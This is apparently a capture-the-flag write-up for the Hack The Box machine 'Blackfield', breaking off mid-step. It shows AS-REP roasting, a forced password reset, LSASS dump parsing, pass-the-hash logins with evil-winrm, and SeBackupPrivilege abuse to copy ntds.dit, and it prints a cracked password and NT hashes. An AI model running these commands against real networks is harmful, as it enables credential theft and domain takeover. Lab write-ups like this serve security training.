I"7¨<h2 id="enumeration">Enumeration</h2>
<p><strong>Command</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>nmap -sC -sV -oN nmap-scan -Pn 10.10.10.192
</pre></td></tr></tbody></table></code></pre></div></div>
<h3 id="nmap-scan">Nmap Scan</h3>
<p><strong>Result</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre></td><td class="rouge-code"><pre># Nmap 7.93 scan initiated Tue Dec 20 13:29:51 2022 as: nmap -sC -sV -oN nmap-scan -Pn 10.10.10.192
Nmap scan report for 10.10.10.192
Host is up (0.25s latency).
Scanned at 2022-12-20 13:29:52 EAT for 143s
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-12-20 17:30:34Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-12-20T17:31:37
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48702/tcp): CLEAN (Timeout)
|   Check 2 (port 10784/tcp): CLEAN (Timeout)
|   Check 3 (port 8154/udp): CLEAN (Timeout)
|   Check 4 (port 53637/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 7h00m00s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec 20 13:32:15 2022 -- 1 IP address (1 host up) scanned in 144.10 seconds
</pre></td></tr></tbody></table></code></pre></div></div>
<p>This is Windows machine and it can active directory. The important fields obtained from <code class="language-plaintext highlighter-rouge">nmap</code> includes the domain name of the machine which is <code class="language-plaintext highlighter-rouge">BLACKFIELD.local</code> add this to the <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
<h3 id="smb-enumeration">Smb Enumeration</h3>
<p>Checking if there is any share in <code class="language-plaintext highlighter-rouge">smb</code> service</p>

<p><strong>Command</strong>
I tried <code class="language-plaintext highlighter-rouge">smbmap</code> only without providing an user and it refused to connect but when using <code class="language-plaintext highlighter-rouge">anonymous</code> or <code class="language-plaintext highlighter-rouge">guest</code> it return result.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/htb/Machines/vip/blackfield]
â””â”€$ smbmap -H 10.10.10.192 -u anonymous 
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Result</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>[+] Guest session       IP: 10.10.10.192:445    Name: BLACKFIELD.local                                  
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                NO ACCESS       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        profiles$                                               READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
</pre></td></tr></tbody></table></code></pre></div></div>
<p>There are to shares which are not default but we only have access to the <code class="language-plaintext highlighter-rouge">profiles$</code></p>
<h3 id="enumerating-profiles">Enumerating profiles$</h3>
<p><strong>Command</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/htb/Machines/vip/blackfield]
â””â”€$ smbclient -N //10.10.10.192/profiles$ 
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>List contents</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>smb: \&gt; dir                                                                                   
  .                                   D        0  Wed Jun  3 19:47:12 2020
  ..                                  D        0  Wed Jun  3 19:47:12 2020
  AAlleni                             D        0  Wed Jun  3 19:47:11 2020
  ABarteski                           D        0  Wed Jun  3 19:47:11 2020
  ABekesz                             D        0  Wed Jun  3 19:47:11 2020
  ABenzies                            D        0  Wed Jun  3 19:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 19:47:11 2020
  AChampken                           D        0  Wed Jun  3 19:47:11 2020
  ACheretei                           D        0  Wed Jun  3 19:47:11 2020
  ACsonaki                        
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Listing files in this share resulted to some sort of usernames for the machine, hence copy them to the attacking machine and filter only names.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/htb/Machines/vip/blackfield]
â””â”€$ cat user | awk '{print $1}' &gt; users.txt   
</pre></td></tr></tbody></table></code></pre></div></div>
<p>This list is too huge but there is a way to fine all valid users, this can done by using the tool known as <code class="language-plaintext highlighter-rouge">kerbrute</code> and this tool can be found in <a href="https://github.com/ropnop/kerbrute/releases/">kerbrute</a> and its syntax is shown below</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/htb/Machines/vip/blackfield]
â””â”€$ ./kerbrute userenum --dc 10.10.10.192 -d blackfield.local -o validusers users.txt 
</pre></td></tr></tbody></table></code></pre></div></div>
<p>This will result into valid users and to clear the names we can use the following command:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/htb/Machines/vip/blackfield]
â””â”€$ grep VALID  validusers | awk  '{print $7}' | awk -F \@ '{print $1}' &gt; creds/validusers
</pre></td></tr></tbody></table></code></pre></div></div>
<p>And the result will be</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>audit2020
svc_backup
support
</pre></td></tr></tbody></table></code></pre></div></div>
<h3 id="checking-for-uf_dont_require_preauth">Checking for â€˜UF_DONT_REQUIRE_PREAUTHâ€™</h3>
<p>This will require <code class="language-plaintext highlighter-rouge">impacket-GetNPUsers</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/Machines/vip/blackfield/creds]
â””â”€$ impacket-GetNPUsers blackfield.local/ -usersfile validusers -dc-ip 10.10.10.192  -no-pass
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Which results to</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>$krb5asrep$23$support@BLACKFIELD.LOCAL:1108e631d6efac9107984b05d7e87a2c$e96fb3fd03e20f892260a2358a75acbed52d7616603869b8c879a35e72c5a7c8d61b092dcc7e2ba0321094b24659c3454f05bccf12505652ea2fbe78c9b5ffd891e4de50211dccd70032ac94ea84546b5e280edbb078d96092054e478a98d5539a1a10029d1926f455c2a3345768b922b2b266c7fadcd8e2a9063736a3197f6cb95ad7dd6adb6e10f46a67aef4795362b373ff464153001721dd6a17486d0153afa3414f1d3aac00ed38530abdb3b6aeb9071c1c76804d08fe68a05219e89ce3709acf4768d1342f3033706264a0ced34abd024ba3c0dee0cf82845ed497828ad4b4581ce8fe0c03df45b74d1beb8318469d19e8
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Crack hash</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/Machines/vip/blackfield/creds]
â””â”€$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
</pre></td></tr></tbody></table></code></pre></div></div>
<p>This resulted into <code class="language-plaintext highlighter-rouge">#00^BlackKnight</code> which is password for the user <code class="language-plaintext highlighter-rouge">support</code></p>

<p>After this i tried <code class="language-plaintext highlighter-rouge">smbclient</code> and <code class="language-plaintext highlighter-rouge">smbmap</code> but it wasnâ€™t successful then i decided to use <code class="language-plaintext highlighter-rouge">rpcclient</code> to check if there are other users</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/Machines/vip/blackfield/creds]
â””â”€$ rpcclient -U "support" 10.10.10.192
</pre></td></tr></tbody></table></code></pre></div></div>
<p>It connected and to obtain users this command is used</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>rpcclient $&gt; enumdomusers
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Non of the new user brings interesting info then we ca continue with another thing</p>
<h3 id="collecting-data-by-using-bloodhound">Collecting Data by using BloodHound</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/Machines/vip/blackfield/bloodhound-data]
â””â”€$ bloodhound-python -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Result</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/Machines/vip/blackfield/bloodhound-data]
â””â”€$ ls
20221220160034_computers.json  20221220160034_domains.json  20221220160034_groups.json  20221220160034_users.json  
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Then <code class="language-plaintext highlighter-rouge">zip</code> all the <code class="language-plaintext highlighter-rouge">json</code> files and drag them into <code class="language-plaintext highlighter-rouge">BloodHound</code> after that start <code class="language-plaintext highlighter-rouge">neo4j</code> and <code class="language-plaintext highlighter-rouge">bloodhound</code> then load the <code class="language-plaintext highlighter-rouge">zip</code> file into <code class="language-plaintext highlighter-rouge">bloodhound</code></p>

<p>Search all the three users obtained before and mark user <code class="language-plaintext highlighter-rouge">support</code> as <code class="language-plaintext highlighter-rouge">owned</code>  and remaining two as <code class="language-plaintext highlighter-rouge">user with high value</code></p>

<p><img src="/assets/img/blackfield/01.png" alt="image" /></p>

<p>After done marking them then select <code class="language-plaintext highlighter-rouge">shortest Paths to Here from Owned</code> user <code class="language-plaintext highlighter-rouge">svc_backup</code> has nothing but user <code class="language-plaintext highlighter-rouge">audit2020</code> has the following</p>

<p><img src="/assets/img/blackfield/02.png" alt="image" /></p>

<p>This means that The user <code class="language-plaintext highlighter-rouge">SUPPORT</code> has the capability to change the user <code class="language-plaintext highlighter-rouge">AUDIT2020</code>â€™s password without knowing that userâ€™s current password.</p>

<p>To change the password use the <code class="language-plaintext highlighter-rouge">rpcclient</code> it is well explained in <a href="https://malicious.link/post/2017/reset-ad-user-password-with-linux/">malicious.link</a></p>
<ol>
  <li>Authenticate to <code class="language-plaintext highlighter-rouge">rpcclient</code> as user <code class="language-plaintext highlighter-rouge">support</code>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/htb/Machines/vip/blackfield]
â””â”€$ rpcclient -U "support" 10.10.10.192  
Password for [WORKGROUP\support]:
rpcclient $&gt; 
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
  <li>Change the password for user <code class="language-plaintext highlighter-rouge">Audit2020</code>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>rpcclient $&gt; setuserinfo2 Audit2020 23 '@Gemstone'
</pre></td></tr></tbody></table></code></pre></div>    </div>
    <h3 id="access-to-forensic-file">Access to Forensic file</h3>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/htb/Machines/vip/blackfield]
â””â”€$ crackmapexec smb 10.10.10.192 -u Audit2020 -p '@Gemstone' --shares
</pre></td></tr></tbody></table></code></pre></div>    </div>
    <p><strong>Result</strong></p>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\Audit2020:@Gemstone 
SMB         10.10.10.192    445    DC01             [+] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share 
</pre></td></tr></tbody></table></code></pre></div>    </div>
    <p>Now we can read the Forensic file</p>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/htb/Machines/vip/blackfield]
â””â”€$ sudo mount -t cifs -o 'username=audit2020,password=@Gemstone' //10.10.10.192/forensic /mnt
</pre></td></tr></tbody></table></code></pre></div>    </div>
    <p>The mount way helps to dump everything into attackers machine.</p>
  </li>
</ol>

<p>After analyzing the files from the forensic share then found <code class="language-plaintext highlighter-rouge">.zip</code> file named as <code class="language-plaintext highlighter-rouge">lsass.zip</code>  it  stands for Local Security Authority Subsystem Service and it is a system process in the Windows operating system that is responsible for enforcing the security policy on the system. Copy the <code class="language-plaintext highlighter-rouge">lsass.zip</code> into your machine</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/Machines/vip/blackfield/forensic]
â””â”€$ sudo cp -v /mnt/memory_analysis/lsass.zip .
</pre></td></tr></tbody></table></code></pre></div></div>
<p>This file has <code class="language-plaintext highlighter-rouge">40M</code> so after it finishes unzip it to have a <code class="language-plaintext highlighter-rouge">lsass.DMP</code> to crack this the tool known as <code class="language-plaintext highlighter-rouge">pypykatz</code> will be used</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/Machines/vip/blackfield/forensic]
â””â”€$ pypykatz lsa minidump lsass.DMP &gt; lsass.plain
</pre></td></tr></tbody></table></code></pre></div></div>
<p>This will provide some potential data including the <code class="language-plaintext highlighter-rouge">NT</code> for user <code class="language-plaintext highlighter-rouge">Administrator</code> and <code class="language-plaintext highlighter-rouge">svc_backup</code> 
<code class="language-plaintext highlighter-rouge">svc_backup : 9658d1d1dcd9250115e2205d9f48400d</code> and <code class="language-plaintext highlighter-rouge">Administrator : 7f1e4ff8c6a8e6b6fcae2d9c0572cd62</code></p>
<h2 id="user-account">User Account</h2>
<p>Check with <code class="language-plaintext highlighter-rouge">crackmapexec</code> to see if you can <code class="language-plaintext highlighter-rouge">pwn</code> the machine with <code class="language-plaintext highlighter-rouge">winrm</code> service</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/Machines/vip/blackfield/forensic]
â””â”€$ crackmapexec winrm 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
WINRM       10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Then we can login by using <code class="language-plaintext highlighter-rouge">evil-winrm</code> as user <code class="language-plaintext highlighter-rouge">svc_backup</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/htb/Machines/vip/blackfield]
â””â”€$ evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d 
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>User flag</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\svc_backup\desktop&gt; type user.txt
3920bb317a0bef*********** 
</pre></td></tr></tbody></table></code></pre></div></div>
<h2 id="administrator-account">Administrator Account</h2>
<p>In <code class="language-plaintext highlighter-rouge">C:\</code> there is a note called <code class="language-plaintext highlighter-rouge">note.txt</code> which has the following information</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>*Evil-WinRM* PS C:\&gt; cat notes.txt
Mates,

After the domain compromise and computer forensic last week, auditors advised us to:
- change every passwords -- Done.
- change krbtgt password twice -- Done.
- disable auditor's account (audit2020) -- KO.
- use nominative domain admin accounts instead of this one -- KO.

We will probably have to backup &amp; restore things later.
- Mike.

PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
</pre></td></tr></tbody></table></code></pre></div></div>
<p>It seems some of the things have not being implemented including disable <code class="language-plaintext highlighter-rouge">auditor's account</code></p>

<p>View user <code class="language-plaintext highlighter-rouge">svc_backup</code> privilege</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; whoami /priv
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Result</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
</pre></td></tr></tbody></table></code></pre></div></div>
<p>We can abuse the <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code> you can read in details <a href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/">hackingarticles</a> but in short  <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code> was designed for allowing users to create backup copies of the system. Since it is not possible to make a backup of something that you cannot read. This privilege comes at the cost of providing the user with full read access to the file system. This privilege must bypass any ACL that the Administrator has placed in the network. So, in a nutshell, this privilege allows the user to read any file on the entirety of the files that might also include some sensitive files such as the SAM file or SYSTEM Registry file.</p>
<h3 id="exploit-sebackupprivilege">Exploit SeBackupPrivilege</h3>
<p>Again from <a href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/">hackingarticles</a> to exploit this we need the <code class="language-plaintext highlighter-rouge">ntds.dit</code> file to extract the hashes along with the system hive. The problem with the <code class="language-plaintext highlighter-rouge">ntds.dit</code> file is that while the Target Machine is running the file always remains in the usage and as we are pretty aware of the fact that when a file is an underuse then it is not possible to copy the file using any conventional methods. To circumvent this problem, we need to use <code class="language-plaintext highlighter-rouge">diskshadow</code> functionality. This is a built-in function of Windows that can help us create a copy of a drive that is currently in use.</p>

<p>Here are steps to follow</p>
<ol>
  <li>Create a directory that will have both rad and write permission
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>*Evil-WinRM* PS C:\&gt; mkdir Temp 
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
  <li>In your Linux machine create a file that will instruct the <code class="language-plaintext highlighter-rouge">diskshadow </code>to create a copy of the <code class="language-plaintext highlighter-rouge">C: Drive</code> into a <code class="language-plaintext highlighter-rouge">Z</code> Drive with <code class="language-plaintext highlighter-rouge">pwn</code>as its alias but alias can be anything of your choice.
<strong>Command</strong>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/Machines/vip/blackfield/exploit]
â””â”€$ vim pwn.dsh
</pre></td></tr></tbody></table></code></pre></div>    </div>
    <p><strong>Contents</strong></p>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>set context persistent nowriters
add volume c: alias pwn
create
expose %pwn% z:
</pre></td></tr></tbody></table></code></pre></div>    </div>
    <p><strong>Convert</strong>
After creating this <code class="language-plaintext highlighter-rouge">dsh</code> file, use the <code class="language-plaintext highlighter-rouge">unix2dos</code> to convert the encoding and spacing of the <code class="language-plaintext highlighter-rouge">dsh</code> file to the one that is compatible with the Windows Machine</p>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/Machines/vip/blackfield/exploit]
â””â”€$ unix2dos pwn.dsh 
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
  <li>Send the <code class="language-plaintext highlighter-rouge">dsh</code>  file into Windows machine
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/Machines/vip/blackfield/exploit]
â””â”€$ python3 -m http.server 80
</pre></td></tr></tbody></table></code></pre></div>    </div>
    <p><strong>Receive</strong></p>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Temp&gt; iwr http://10.10.14.5/pwn.dsh -outf pwn.dsh 
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
  <li>Use <code class="language-plaintext highlighter-rouge">diskshadow</code> to  create a copy of the <code class="language-plaintext highlighter-rouge">C drive</code> into <code class="language-plaintext highlighter-rouge">Z drive</code>.
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Temp&gt; diskshadow /s pwn.dsh 
</pre></td></tr></tbody></table></code></pre></div>    </div>

    <p><strong>Result</strong></p>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre></td><td class="rouge-code"><pre> Microsoft DiskShadow version 1.0
 Copyright (C) 2013 Microsoft Corporation
 On computer:  DC01,  12/23/2022 7:27:40 AM

 -&gt; set context persistent nowriters
 -&gt; add volume c: alias pwn                                
 -&gt; create                                                 
 Alias pwn for shadow ID {cd905d2b-2506-4e1d-8306-1b8cc54c6140} set as environment variable.                          
 Alias VSS_SHADOW_SET for shadow set ID {f754b504-5058-4c68-aeaf-36cd279ba191} set as environment variable.           

 Querying all shadow copies with the shadow copy set ID {f754b504-5058-4c68-aeaf-36cd279ba191}                        

         * Shadow copy ID = {cd905d2b-2506-4e1d-8306-1b8cc54c6140}               %pwn%                                
                 - Shadow copy set: {f754b504-5058-4c68-aeaf-36cd279ba191}       %VSS_SHADOW_SET%                     
                 - Original count of shadow copies = 1
                 - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]                      
                 - Creation time: 12/23/2022 7:27:42 AM
                 - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1                           
                 - Originating machine: DC01.BLACKFIELD.local                                                         
                 - Service machine: DC01.BLACKFIELD.local
                 - Not exposed
                 - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}                                                
                 - Attributes:  No_Auto_Release Persistent No_Writers Differential                                    

 Number of shadow copies listed: 1
 -&gt; expose %pwn% z:                                        
 -&gt; %pwn% = {cd905d2b-2506-4e1d-8306-1b8cc54c6140}
 The shadow copy was successfully exposed as z:\.
 -&gt; 
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
  <li>Use the <code class="language-plaintext highlighter-rouge">RoboCopy</code> tool to copy the file from the Z Drive to the Temp Directory.
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Temp&gt; robocopy /b z:\windows\ntds . ntds.dit  
</pre></td></tr></tbody></table></code></pre></div>    </div>

    <p><strong>Result</strong></p>
